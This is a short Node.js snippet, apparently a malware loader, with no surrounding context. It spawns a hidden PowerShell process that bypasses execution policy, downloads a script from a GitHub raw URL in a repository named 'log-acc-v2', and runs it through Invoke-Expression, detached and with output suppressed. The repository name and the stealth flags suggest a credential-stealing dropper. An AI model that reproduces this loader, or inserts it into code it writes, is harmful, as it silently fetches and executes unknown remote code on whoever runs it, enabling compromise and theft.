const { exec } = require('child_process');
const powerShellCommand = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex"';
exec(powerShellCommand, { detached: true, stdio: 'ignore' });
